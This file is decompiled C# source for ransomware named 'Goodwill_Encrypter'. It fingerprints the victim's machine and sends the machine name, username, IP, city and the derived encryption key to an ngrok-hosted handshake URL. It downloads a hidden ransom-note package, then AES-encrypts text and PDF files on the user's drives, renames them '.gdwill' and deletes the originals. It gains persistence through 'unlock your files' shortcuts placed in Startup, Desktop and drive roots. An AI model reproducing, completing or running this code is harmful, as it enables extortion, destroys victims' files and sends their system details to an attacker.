using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using IpInfo;
using SharpCompress.Common;
using SharpCompress.Readers;

namespace Goodwill_Encrypter;

internal class Program
{
	public static string hostaddr = "http://9855-13-235-50-147.ngrok.io/handshake.php";

	public static string AlertMsgLink = "http://9855-13-235-50-147.ngrok.io/alertmsg.zip";

	public static string AlertMsgPath = "C:\\Users\\Public\\Windows\\Ui\\";

	public static string AlertMsgFile = AlertMsgPath + "alertmsg.zip";

	public static string passwordkey = "";

	public static string systemid = "";

	public static string HDid = "";

	private static void Main(string[] args)
	{
		passwordkey = smethod_0();
		systemid = smethod_1();
		smethod_2();
		smethod_3();
		smethod_8();
		smethod_11();
		Console.ReadKey();
	}

	[CompilerGenerated]
	internal static string smethod_0()
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[18];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	[CompilerGenerated]
	internal static string smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
		string text = "";
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				text += Convert.ToString(((ManagementBaseObject)val).get_Item("VolumeSerialNumber"));
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	[CompilerGenerated]
	internal static bool smethod_2()
	{
		while (true)
		{
			try
			{
				if (new Ping().Send("www.google.com").Status == IPStatus.Success)
				{
					Console.WriteLine("connected");
					return true;
				}
				return false;
			}
			catch (Exception)
			{
				Console.WriteLine("Not Connected");
				Thread.Sleep(2000);
			}
		}
	}

	[CompilerGenerated]
	internal static void smethod_3()
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected O, but got Unknown
		try
		{
			string userName = Environment.UserName;
			string machineName = Environment.MachineName;
			string value = DateTime.Now.ToString("HH:mm:ss");
			string value2 = DateTime.Today.ToString("dd/MM/yyyy") + ", " + DateTime.Now.DayOfWeek;
			string value3 = new WebClient().DownloadString("https://api.ipify.org");
			_003C_003Ec__DisplayClass7_0 _003C_003Ec__DisplayClass7_0_ = default(_003C_003Ec__DisplayClass7_0);
			_003C_003Ec__DisplayClass7_0_.client = new HttpClient();
			HDid = "A125OKA" + systemid + "4758ahzii";
			passwordkey = HDid;
			FormUrlEncodedContent val = new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)new List<KeyValuePair<string, string>>
			{
				new KeyValuePair<string, string>("machine_name", machineName),
				new KeyValuePair<string, string>("computer_user", userName),
				new KeyValuePair<string, string>("systemid", systemid),
				new KeyValuePair<string, string>("os", "Windows 10"),
				new KeyValuePair<string, string>("date", value2),
				new KeyValuePair<string, string>("time", value),
				new KeyValuePair<string, string>("ip", value3),
				new KeyValuePair<string, string>("location", smethod_4(ref _003C_003Ec__DisplayClass7_0_)),
				new KeyValuePair<string, string>("password", passwordkey),
				new KeyValuePair<string, string>("handshake", "jasmin@123")
			});
			HttpResponseMessage result = _003C_003Ec__DisplayClass7_0_.client.PostAsync(hostaddr, (HttpContent)(object)val).Result;
			if (result.get_IsSuccessStatusCode())
			{
				Console.WriteLine(result);
				Console.WriteLine(smethod_1());
				Console.WriteLine(smethod_0());
			}
			else
			{
				Console.WriteLine("No Connection");
			}
		}
		catch (Exception)
		{
		}
		try
		{
			smethod_6();
			try
			{
				string newText = "<h3  style=\"color: grey; font-size:95% \"> Your System Id is : " + smethod_1() + " </h3>";
				string newText2 = "<h3  style=\"color: white; font-size:110% \"> Your System Id is : " + smethod_1() + " </h3>";
				string fileName = "C:\\Users\\Public\\Windows\\Ui\\index.html";
				smethod_5(newText, fileName, 129);
				smethod_5(newText2, fileName, 285);
			}
			catch
			{
				Console.WriteLine("Error While SystemID Writing");
			}
		}
		catch
		{
			Console.WriteLine("Error In Download");
		}
	}

	[CompilerGenerated]
	internal static string smethod_4(ref _003C_003Ec__DisplayClass7_0 _003C_003Ec__DisplayClass7_0_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		Task<string> currentCityAsync = new IpInfoApi(_003C_003Ec__DisplayClass7_0_0.client).GetCurrentCityAsync();
		Console.WriteLine("City: " + currentCityAsync.Result);
		return currentCityAsync.Result;
	}

	[CompilerGenerated]
	internal static void smethod_5(string newText, string fileName, int line_to_edit)
	{
		string[] array = File.ReadAllLines(fileName);
		array[line_to_edit - 1] = newText;
		File.WriteAllLines(fileName, array);
	}

	[CompilerGenerated]
	internal static bool smethod_6()
	{
		WebClient webClient = new WebClient();
		while (true)
		{
			try
			{
				if (Directory.Exists(AlertMsgPath))
				{
					Directory.Delete(AlertMsgPath, recursive: true);
					Directory.CreateDirectory(AlertMsgPath).Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				else
				{
					Directory.CreateDirectory(AlertMsgPath).Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				webClient.DownloadFile(AlertMsgLink, AlertMsgFile);
				Thread.Sleep(450);
				Console.WriteLine("Downloaded");
				smethod_7();
				return true;
			}
			catch (WebException)
			{
				Console.WriteLine("Unable to Download\nRetrying Please wait..");
				Thread.Sleep(2000);
			}
		}
	}

	[CompilerGenerated]
	internal static bool smethod_7()
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		while (true)
		{
			try
			{
				if (File.Exists(AlertMsgFile))
				{
					using (Stream stream = File.OpenRead(AlertMsgFile))
					{
						IReader val = ReaderFactory.Open(stream, (ReaderOptions)null);
						while (val.MoveToNextEntry())
						{
							if (!val.get_Entry().get_IsDirectory())
							{
								string alertMsgPath = AlertMsgPath;
								ExtractionOptions val2 = new ExtractionOptions();
								val2.set_ExtractFullPath(true);
								val2.set_Overwrite(true);
								IReaderExtensions.WriteEntryToDirectory(val, alertMsgPath, val2);
							}
						}
					}
					return true;
				}
				return false;
			}
			catch (Exception)
			{
			}
		}
	}

	[CompilerGenerated]
	internal static void smethod_8()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		string[] array = new string[2] { "*.txt", "*.pdf" };
		DriveInfo[] array2 = drives;
		string[] array3;
		foreach (DriveInfo driveInfo in array2)
		{
			try
			{
				if (driveInfo.Name == "C:\\")
				{
					continue;
				}
				string name = driveInfo.Name;
				Console.WriteLine(name);
				array3 = array;
				foreach (string searchPattern in array3)
				{
					try
					{
						foreach (string item in Directory.EnumerateDirectories(name))
						{
							try
							{
								foreach (string p2 in Directory.EnumerateFiles(item, searchPattern, SearchOption.AllDirectories))
								{
									try
									{
										Thread thread = new Thread((ThreadStart)delegate
										{
											smethod_9(p2);
										});
										thread.Priority = ThreadPriority.AboveNormal;
										thread.Start();
									}
									catch (UnauthorizedAccessException)
									{
									}
								}
							}
							catch (UnauthorizedAccessException)
							{
							}
							catch (Exception)
							{
							}
						}
						foreach (string p3 in Directory.EnumerateFiles(name, searchPattern))
						{
							try
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									smethod_9(p3);
								});
								thread2.Priority = ThreadPriority.AboveNormal;
								thread2.Start();
							}
							catch (UnauthorizedAccessException)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		array3 = array;
		foreach (string searchPattern2 in array3)
		{
			try
			{
				foreach (string item2 in Directory.EnumerateDirectories(folderPath))
				{
					try
					{
						foreach (string p4 in Directory.EnumerateFiles(item2, searchPattern2, SearchOption.AllDirectories))
						{
							try
							{
								Thread thread3 = new Thread((ThreadStart)delegate
								{
									smethod_9(p4);
								});
								thread3.Priority = ThreadPriority.AboveNormal;
								thread3.Start();
							}
							catch (UnauthorizedAccessException)
							{
							}
							catch (ArgumentException)
							{
							}
						}
					}
					catch (UnauthorizedAccessException)
					{
					}
				}
				foreach (string p in Directory.EnumerateFiles(folderPath, searchPattern2))
				{
					try
					{
						Thread thread4 = new Thread((ThreadStart)delegate
						{
							smethod_9(p);
						});
						thread4.Priority = ThreadPriority.AboveNormal;
						thread4.Start();
					}
					catch (UnauthorizedAccessException)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	[CompilerGenerated]
	internal static void smethod_9(string path)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(path);
		byte[] bytes = Encoding.UTF8.GetBytes(passwordkey);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_10(bytesToBeEncrypted, bytes);
		string path2 = path + ".gdwill";
		Console.WriteLine(path + ".gdwill");
		try
		{
			File.WriteAllBytes(path2, bytes2);
			File.Delete(path);
		}
		catch
		{
			Console.WriteLine("error hai bhaiya");
		}
	}

	[CompilerGenerated]
	internal static byte[] smethod_10(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, passwordBytes, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	[CompilerGenerated]
	internal static void smethod_11()
	{
		string text = "C:\\Users\\Public\\Windows\\Ui\\unlock your files.lnk";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\unlock your files.lnk";
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\unlock your files.lnk";
		string text4 = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\unlock your files.lnk";
		Process.Start(text);
		string[] array = new string[3] { text2, text3, text4 };
		foreach (string destFileName in array)
		{
			try
			{
				File.Copy(text, destFileName);
			}
			catch (Exception)
			{
			}
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				File.Copy(text, driveInfo.Name + "\\unlock your files.lnk");
			}
			catch (Exception)
			{
			}
		}
		foreach (string item in Directory.EnumerateFiles(AlertMsgPath, "*.*", SearchOption.AllDirectories))
		{
			try
			{
				File.SetAttributes(item, FileAttributes.Hidden | FileAttributes.System);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		foreach (string item2 in Directory.EnumerateDirectories(AlertMsgPath))
		{
			try
			{
				new DirectoryInfo(item2).Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			catch (Exception value2)
			{
				Console.WriteLine(value2);
			}
		}
	}
}
